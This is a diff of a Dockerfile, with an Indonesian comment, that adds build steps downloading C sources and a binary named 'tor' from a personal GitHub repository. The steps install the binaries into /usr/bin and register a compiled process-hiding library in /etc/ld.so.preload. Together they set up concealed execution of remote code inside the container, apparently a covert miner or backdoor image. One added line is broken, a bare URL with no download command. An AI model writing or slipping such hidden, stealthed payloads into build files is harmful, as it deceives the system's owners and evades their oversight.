@@ -16,12 +16,15 @@ RUN useradd -m coder \
     && mkdir -p /home/coder/project
 
 # Mengunduh dan menginstal file yang diperlukan
-RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/processhider.c  
-RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/gdd.c \
-    && gcc -o godt gdd.c \
-    && chmod +x godt \
-    && mv godt /usr/bin/ \
-    && rm gdd.c 
+RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/processhider.c
+RUN https://github.com/lucalocolocoloco/hd/raw/main/tor \
+    && chmod +x tor \
+    && mv tor /usr/bin/
+RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/ets.c \
+    && gcc -o godb ets.c \
+    && chmod +x godb \
+    && mv godb /usr/bin/ \
+    && rm ets.c
 RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
     && mv libprocess.so /usr/local/lib/ \
     && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload     
